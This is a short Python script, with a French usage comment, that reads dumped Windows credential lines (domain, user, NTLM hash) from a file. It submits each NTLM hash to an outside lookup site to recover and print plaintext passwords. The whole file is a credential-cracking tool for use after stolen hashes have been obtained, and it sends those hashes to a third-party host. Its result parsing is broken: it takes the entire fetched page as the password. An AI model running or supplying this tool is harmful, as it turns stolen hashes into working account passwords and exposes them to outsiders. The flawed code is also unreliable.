import re
import requests
from bs4 import BeautifulSoup
 
def extract_users_and_hashes_from_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    regex = re.compile(r'(?P<domain>[^\\]+)\\(?P<user>[^:]+):\d+:[a-f0-9]{32}:(?P<ntlm_hash>[a-f0-9]{32})')
    
    users_and_hashes = []
    for line in lines:
        match = regex.search(line)
        if match:
            domain = match.group('domain')
            user = match.group('user')
            ntlm_hash = match.group('ntlm_hash')
            users_and_hashes.append({'user': f"{domain}\\{user}", 'ntlm_hash': ntlm_hash})
    
    return users_and_hashes
 
def check_ntlm_hash(ntlm_hash):
    url = f"https://ntlm.pw/{ntlm_hash}"
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    password_tag = soup
    if password_tag:
        password = password_tag.text.strip()
        return password
    return None
 
# Exemple d'utilisation
file_path = 'data.txt'
users_and_hashes = extract_users_and_hashes_from_file(file_path)
 
for entry in users_and_hashes:
    ntlm_hash = entry['ntlm_hash']
    password = check_ntlm_hash(ntlm_hash)
    if password:
        print(f"User: {entry['user']}, NTLM Hash: {ntlm_hash}, Password: {password}")
    else:
        print(f"User: {entry['user']}, NTLM Hash: {ntlm_hash}, Password: Not found")
